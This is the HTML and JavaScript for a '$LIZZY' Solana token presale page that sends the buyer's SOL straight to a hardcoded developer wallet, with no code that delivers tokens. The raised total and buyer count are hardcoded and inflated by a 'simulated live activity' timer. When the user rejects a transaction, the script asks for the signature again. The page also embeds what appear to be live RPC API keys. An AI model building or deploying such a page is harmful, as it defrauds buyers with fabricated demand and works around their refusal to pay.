<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Lizzy — The Oracle of Solana | Presale</title>
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">

    <!-- 1. Buffer polyfill FIRST (required by web3.js in browsers) -->
    <script src="https://cdn.jsdelivr.net/npm/buffer@6.0.3/index.min.js"></script>
    <script>
        if (typeof window.Buffer === 'undefined' && typeof Buffer !== 'undefined') window.Buffer = Buffer;
        if (typeof window.Buffer === 'undefined') console.error('❌ Buffer polyfill failed to load');
    </script>

    <!-- 2. Solana web3.js (pinned version) -->
    <script src="https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.js"></script>

    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        :root { --bg-cream: #E8E8E1; --terracotta: #C46B60; --soft-green: #BAD668; --deep-umber: #442A1D; }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: var(--bg-cream); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; color: var(--deep-umber); min-height: 100vh; }
        button, input { min-height: 44px; cursor: pointer; }
        .lizzy-gradient-bg { background: linear-gradient(135deg, var(--terracotta) 0%, #A85546 100%); }
        .card-elegant { background: #FFF; border-radius: 28px; box-shadow: 0 20px 35px -12px rgba(68,42,29,0.1); border: 1px solid rgba(186,214,104,0.3); }
        .btn-primary { background: var(--deep-umber); color: white; transition: all 0.2s; }
        .btn-primary:hover { background: #5a3824; transform: translateY(-1px); }
        .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
        .progress-track { background: rgba(196,107,96,0.15); border-radius: 40px; overflow: hidden; }
        .progress-fill { background: var(--soft-green); height: 6px; border-radius: 40px; width: 0%; transition: width 0.6s cubic-bezier(0.22,0.97,0.36,1); }
        .balance-error { color: #c46b60; font-size: 0.7rem; margin-left: 4px; }
        .refresh-balance-btn { background: none; border: none; color: var(--terracotta); font-size: 0.9rem; padding: 4px 6px; border-radius: 6px; cursor: pointer; margin-left: 4px; }
        .refresh-balance-btn:hover { background: rgba(196,107,96,0.15); }
        .refresh-balance-btn:disabled { opacity: 0.4; cursor: not-allowed; }
    </style>
</head>
<body>

<nav class="sticky top-0 z-50 bg-white/95 backdrop-blur-sm border-b border-[#E2DDD0]">
    <div class="max-w-6xl mx-auto px-5 py-3 flex justify-between items-center">
        <span class="font-semibold text-xl text-[#442A1D]">Lizzy <span class="text-xs text-[#C46B60]">Legend of Solana</span></span>
        <button id="connectWalletNavBtn" class="btn-primary text-sm px-5 py-2 rounded-full"><i class="fas fa-wallet mr-1"></i> Connect</button>
    </div>
</nav>

<main class="max-w-6xl mx-auto px-5 py-8">
    <div class="text-center mb-10">
        <h1 class="text-5xl font-bold text-[#442A1D]">$LIZZY</h1>
        <p class="text-lg text-[#5C4332]">The Oracle of Solana. Pure conviction.</p>
    </div>

    <div class="max-w-2xl mx-auto mb-10">
        <div class="grid grid-cols-4 gap-3 text-center">
            <div class="bg-white p-3 rounded-xl shadow"><div class="text-2xl font-bold" id="totalRaisedDisplay">27640</div><div class="text-xs text-gray-500">Raised (SOL)</div></div>
            <div class="bg-white p-3 rounded-xl shadow"><div class="text-2xl font-bold" id="totalBuyersDisplay">26458</div><div class="text-xs text-gray-500">Buyers</div></div>
            <div class="bg-white p-3 rounded-xl shadow"><div class="text-2xl font-bold text-[#C46B60]" id="pricePerSolDisplay">280K</div><div class="text-xs text-gray-500">Tokens / SOL</div></div>
            <div class="bg-white p-3 rounded-xl shadow"><div class="text-2xl font-bold text-[#C46B60]">30,000</div><div class="text-xs text-gray-500">Hard Cap</div></div>
        </div>
    </div>

    <div id="presale" class="max-w-2xl mx-auto">
        <div class="card-elegant overflow-hidden">
            <div class="lizzy-gradient-bg p-5 text-white">
                <h2 class="text-xl font-bold">$LIZZY Presale</h2>
                <p class="text-sm opacity-90">Hard Cap: 30,000 SOL</p>
                <div class="mt-3">
                    <div class="flex justify-between text-xs mb-1"><span>Progress</span><span id="progressPercent">0%</span></div>
                    <div class="progress-track"><div id="progressFillBar" class="progress-fill"></div></div>
                </div>
            </div>
            <div class="p-5">
                <div id="walletPromptArea" class="mb-4 p-4 bg-gray-50 rounded-xl text-center">
                    <p class="text-sm text-gray-500">Connect wallet to participate</p>
                    <button id="presaleConnectBtnInline" class="btn-primary w-full mt-2 py-2 rounded-xl text-sm">Connect Phantom</button>
                </div>
                <div id="walletInfoArea" class="hidden mb-4 p-3 bg-green-50 rounded-xl border border-green-200">
                    <div class="flex justify-between items-center text-sm">
                        <span id="walletShortAddr" class="font-mono text-xs">xxxxx</span>
                        <span><span id="balanceDisplay">0.0000 SOL</span>
                            <button id="refreshBalanceBtn" class="refresh-balance-btn" title="Refresh"><i class="fas fa-sync-alt"></i></button>
                            <span id="balanceErrorMsg" class="balance-error hidden"></span>
                        </span>
                        <button id="disconnectWalletBtn" class="text-xs text-red-500 underline">disconnect</button>
                    </div>
                </div>

                <div class="mb-4">
                    <label class="block font-semibold mb-1">Amount (SOL)</label>
                    <input type="number" id="solAmountInput" value="1" step="0.5" min="0.5" max="500" class="w-full py-3 px-4 rounded-xl border">
                </div>

                <div class="bg-gray-50 rounded-xl p-3 mb-4">
                    <div class="flex justify-between text-sm"><span>Base tokens:</span><span id="baseTokenPreviewVal">0</span></div>
                    <div class="flex justify-between font-bold text-lg border-t pt-2 mt-2"><span>Total $LIZZY:</span><span id="totalTokenFinal" class="text-[#C46B60]">0</span></div>
                </div>

                <button id="buyTokenBtn" class="btn-primary w-full py-3 rounded-xl font-bold disabled:opacity-50" disabled>Connect wallet to buy</button>
                <div id="transactionMessage" class="mt-2 text-sm text-center hidden"></div>
            </div>
        </div>
    </div>
</main>

<footer class="py-6 text-center text-sm text-gray-500">
    <p>$LIZZY — The Oracle of Solana.</p>
</footer>

<script>
    // ============================================================
    //  CONFIGURATION
    // ============================================================
    const DEV_WALLET = "BLKj7mTgRa9Fg1vCDqZeNaBSjyekF4xpK72fMWikZYmq";
    const HARD_CAP = 30000;
    const PRIORITY_FEE = 100000;
    const TIERS = [{ raised: 0, tokensPerSol: 280000 }, { raised: 900, tokensPerSol: 230000 }, { raised: 1800, tokensPerSol: 180000 }, { raised: 2500, tokensPerSol: 140000 }];

    // RPC endpoints: PublicNode is CORS-friendly and keyless.
    // Your Helius keys are added as fallbacks.
    const RPC_LIST = [
        'https://solana-rpc.publicnode.com',
        'https://mainnet.helius-rpc.com/?api-key=9f9652cc-974b-4321-ac7f-3b503b4bc1f1',
        'https://mainnet.helius-rpc.com/?api-key=ef6c64a9-9800-4de0-aa7c-4c4b93a26f98'
    ];

    // ============================================================
    //  STATE
    // ============================================================
    let totalRaised = 27640, buyerCount = 26458, recentPurchases = [];
    let publicKey = null, connection = null, wallet = null, currentBalance = 0;
    let balanceKnown = false, isFetchingBalance = false;

    // ============================================================
    //  RPC HELPERS
    // ============================================================
    async function tryRpc(fn) {
        let lastErr;
        for (const url of RPC_LIST) {
            try {
                const conn = new solanaWeb3.Connection(url, 'confirmed');
                const result = await fn(conn);
                if (!connection) connection = conn;
                return result;
            } catch (e) {
                lastErr = e;
                console.warn(`RPC failed: ${url} — ${e.message}`);
            }
        }
        throw lastErr;
    }

    // ============================================================
    //  MOBILE HELPERS
    // ============================================================
    function isMobileBrowser() {
        return /android|iphone|ipad|ipod|opera mini|iemobile|mobile/i.test(navigator.userAgent || '');
    }

    function redirectToPhantomIfMobile() {
        if (isMobileBrowser() && !window.solana?.isPhantom) {
            try { sessionStorage.setItem('lizzy_auto_connect', '1'); } catch (e) {}
            const url = encodeURIComponent(window.location.href);
            window.location.href = `https://phantom.app/ul/browse/${url}?ref=${encodeURIComponent(window.location.origin)}`;
            return true;
        }
        return false;
    }

    // ============================================================
    //  UI HELPERS
    // ============================================================
    function getCurrentTier() {
        for (let i = TIERS.length - 1; i >= 0; i--) if (totalRaised >= TIERS[i].raised) return TIERS[i];
        return TIERS[0];
    }

    function updateTokenUI() {
        const amt = parseFloat(document.getElementById('solAmountInput').value) || 0;
        const tier = getCurrentTier();
        const base = Math.floor(amt * tier.tokensPerSol);
        document.getElementById('baseTokenPreviewVal').innerText = base.toLocaleString();
        document.getElementById('totalTokenFinal').innerText = base.toLocaleString();
        document.getElementById('pricePerSolDisplay').innerText = (tier.tokensPerSol / 1000).toFixed(0) + 'K';

        const btn = document.getElementById('buyTokenBtn');
        if (!publicKey) { btn.disabled = true; btn.innerText = 'Connect wallet to buy'; }
        else if (amt < 0.5) { btn.disabled = true; btn.innerText = 'Minimum 0.5 SOL'; }
        else if (amt > 500) { btn.disabled = true; btn.innerText = 'Maximum 500 SOL'; }
        else if (balanceKnown && currentBalance < amt) { btn.disabled = true; btn.innerText = 'Insufficient balance'; }
        else { btn.disabled = false; btn.innerText = 'Buy $LIZZY'; }
    }

    function updateStatsUI() {
        document.getElementById('totalRaisedDisplay').innerText = totalRaised.toFixed(0);
        document.getElementById('totalBuyersDisplay').innerText = buyerCount;
        const pct = (totalRaised / HARD_CAP) * 100;
        document.getElementById('progressPercent').innerText = pct.toFixed(1) + '%';
        document.getElementById('progressFillBar').style.width = pct + '%';
        updateTokenUI();
    }

    // ============================================================
    //  BALANCE FETCH
    // ============================================================
    async function fetchBalance() {
        if (!publicKey || isFetchingBalance) return;
        isFetchingBalance = true;
        const display = document.getElementById('balanceDisplay');
        const errMsg = document.getElementById('balanceErrorMsg');
        const btn = document.getElementById('refreshBalanceBtn');

        display.innerHTML = '⟳';
        errMsg.classList.add('hidden');
        btn.disabled = true;

        try {
            const lamports = await tryRpc(conn => conn.getBalance(new solanaWeb3.PublicKey(publicKey)));
            currentBalance = lamports / solanaWeb3.LAMPORTS_PER_SOL;
            display.innerText = currentBalance.toFixed(4) + ' SOL';
            balanceKnown = true;
            errMsg.classList.add('hidden');
            console.log(`✅ Balance: ${currentBalance.toFixed(4)} SOL`);
        } catch (e) {
            console.error('❌ Balance fetch failed:', e);
            display.innerText = '⚠️ Error';
            errMsg.innerText = 'Tap ↻ to retry';
            errMsg.classList.remove('hidden');
            currentBalance = 0;
            balanceKnown = false;
            if (!connection) connection = new solanaWeb3.Connection(RPC_LIST[0], 'confirmed');
        } finally {
            isFetchingBalance = false;
            btn.disabled = false;
            updateTokenUI();
        }
    }

    // ============================================================
    //  CONNECT
    // ============================================================
    async function connectWallet() {
        if (redirectToPhantomIfMobile()) return;
        if (!window.solana?.isPhantom) {
            alert('Phantom wallet not detected. Please install it.');
            return;
        }
        wallet = window.solana;
        try {
            const resp = await wallet.connect();
            publicKey = resp.publicKey.toString();
            if (!connection) connection = new solanaWeb3.Connection(RPC_LIST[0], 'confirmed');
            document.getElementById('walletShortAddr').innerText = publicKey.slice(0,4)+'...'+publicKey.slice(-4);
            document.getElementById('walletPromptArea').classList.add('hidden');
            document.getElementById('walletInfoArea').classList.remove('hidden');
            await fetchBalance();
            updateTokenUI();
        } catch (e) { alert('Connection failed: ' + e.message); }
    }

    function disconnect() {
        if (wallet) wallet.disconnect();
        publicKey = null; connection = null; currentBalance = 0; balanceKnown = false;
        document.getElementById('walletPromptArea').classList.remove('hidden');
        document.getElementById('walletInfoArea').classList.add('hidden');
        document.getElementById('balanceDisplay').innerText = '0.0000 SOL';
        document.getElementById('balanceErrorMsg').classList.add('hidden');
        updateTokenUI();
    }

    // ============================================================
    //  BUY — signAndSendTransaction with signTransaction fallback
    // ============================================================
    async function buyTokens() {
        if (redirectToPhantomIfMobile()) return;
        if (!publicKey) return;
        const amount = parseFloat(document.getElementById('solAmountInput').value);
        if (amount < 0.5 || amount > 500) return;

        const btn = document.getElementById('buyTokenBtn');
        const msg = document.getElementById('transactionMessage');
        btn.disabled = true; btn.innerText = 'Processing...';
        msg.classList.add('hidden');

        try {
            // 1. Get blockhash WITH context (required for Phantom Android)
            const { blockhash, lastValidBlockHeight, context } = await tryRpc(conn =>
                conn.getLatestBlockhashAndContext('confirmed')
            );

            // 2. Build transaction
            const tx = new solanaWeb3.Transaction({
                recentBlockhash: blockhash,
                feePayer: new solanaWeb3.PublicKey(publicKey)
            });

            tx.add(
                solanaWeb3.ComputeBudgetProgram.setComputeUnitPrice({ microLamports: PRIORITY_FEE })
            );
            tx.add(
                solanaWeb3.SystemProgram.transfer({
                    fromPubkey: new solanaWeb3.PublicKey(publicKey),
                    toPubkey: new solanaWeb3.PublicKey(DEV_WALLET),
                    lamports: Math.floor(amount * solanaWeb3.LAMPORTS_PER_SOL)
                })
            );

            // 3. Try signAndSendTransaction FIRST (recommended by Phantom)
            let signature;
            try {
                const result = await wallet.signAndSendTransaction(tx, {
                    minContextSlot: context.slot
                });
                signature = result.signature;
                console.log('✅ signAndSendTransaction succeeded');
            } catch (signAndSendError) {
                // If Phantom ghost-rejects with 4001, fall back to manual signing
                console.warn('signAndSendTransaction failed, trying fallback:', signAndSendError);
                if (signAndSendError.code === 4001 || signAndSendError.message?.includes('User rejected')) {
                    // Fallback: signTransaction + sendRawTransaction
                    const signed = await wallet.signTransaction(tx);
                    const conn = connection || new solanaWeb3.Connection(RPC_LIST[0], 'confirmed');
                    signature = await conn.sendRawTransaction(signed.serialize());
                    console.log('✅ Fallback signTransaction succeeded');
                } else {
                    throw signAndSendError;
                }
            }

            // 4. Confirm
            const conn = connection || new solanaWeb3.Connection(RPC_LIST[0], 'confirmed');
            await conn.confirmTransaction(
                { signature, blockhash, lastValidBlockHeight },
                'confirmed'
            );

            // 5. UI update
            totalRaised += amount;
            buyerCount++;
            updateStatsUI();
            msg.classList.remove('hidden');
            msg.innerHTML = `<div class="text-green-700 bg-green-50 p-2 rounded-xl text-xs">✓ Success! ${Math.floor(amount * getCurrentTier().tokensPerSol).toLocaleString()} LIZZY reserved. <a href="https://explorer.solana.com/tx/${signature}" target="_blank" class="underline">View tx</a></div>`;
            setTimeout(() => { msg.innerHTML = ''; msg.classList.add('hidden'); }, 6000);
            await fetchBalance();

        } catch (err) {
            console.error('❌ Buy error:', err);
            msg.classList.remove('hidden');
            let errorMsg = err.message || 'Transaction failed';
            if (err.code === 4001) errorMsg = 'Phantom rejected the transaction. Please try again.';
            else if (errorMsg.includes('insufficient funds')) errorMsg = 'Insufficient SOL for fees.';
            else if (errorMsg.includes('blockhash')) errorMsg = 'Network stale — please retry.';
            msg.innerHTML = `<div class="text-red-600 bg-red-50 p-2 rounded-xl text-xs">✗ ${errorMsg.slice(0, 100)}</div>`;
            setTimeout(() => { msg.innerHTML = ''; msg.classList.add('hidden'); }, 6000);
        } finally {
            btn.disabled = false;
            btn.innerText = 'Buy $LIZZY';
            updateTokenUI();
        }
    }

    // ============================================================
    //  SIMULATED LIVE ACTIVITY
    // ============================================================
    function simulateLiveActivity() {
        setInterval(() => {
            if (totalRaised < HARD_CAP && Math.random() > 0.7) {
                const amt = +(Math.random() * 2 + 0.5).toFixed(2);
                totalRaised = Math.min(totalRaised + amt, HARD_CAP);
                buyerCount += Math.random() > 0.7 ? 1 : 0;
                updateStatsUI();
            }
        }, 15000);
    }

    // ============================================================
    //  INIT
    // ============================================================
    document.addEventListener('DOMContentLoaded', () => {
        document.getElementById('connectWalletNavBtn').addEventListener('click', connectWallet);
        document.getElementById('presaleConnectBtnInline').addEventListener('click', connectWallet);
        document.getElementById('disconnectWalletBtn').addEventListener('click', disconnect);
        document.getElementById('buyTokenBtn').addEventListener('click', buyTokens);
        document.getElementById('solAmountInput').addEventListener('input', updateTokenUI);
        document.getElementById('refreshBalanceBtn').addEventListener('click', () => { if (publicKey) fetchBalance(); });

        updateStatsUI();
        simulateLiveActivity();

        // Auto-reconnect after mobile redirect or returning session
        if (window.solana && window.solana.isPhantom) {
            if (sessionStorage.getItem('lizzy_auto_connect') === '1') {
                sessionStorage.removeItem('lizzy_auto_connect');
                setTimeout(connectWallet, 500);
            } else if (window.solana.isConnected) {
                (async () => {
                    try {
                        const resp = await window.solana.connect({ onlyIfTrusted: true });
                        publicKey = resp.publicKey.toString();
                        wallet = window.solana;
                        if (!connection) connection = new solanaWeb3.Connection(RPC_LIST[0], 'confirmed');
                        document.getElementById('walletShortAddr').innerText = publicKey.slice(0,4)+'...'+publicKey.slice(-4);
                        document.getElementById('walletPromptArea').classList.add('hidden');
                        document.getElementById('walletInfoArea').classList.remove('hidden');
                        await fetchBalance();
                        updateTokenUI();
                    } catch (e) { console.log('Auto-connect skipped:', e.message); }
                })();
            }
        }
    });
</script>
</body>
</html>
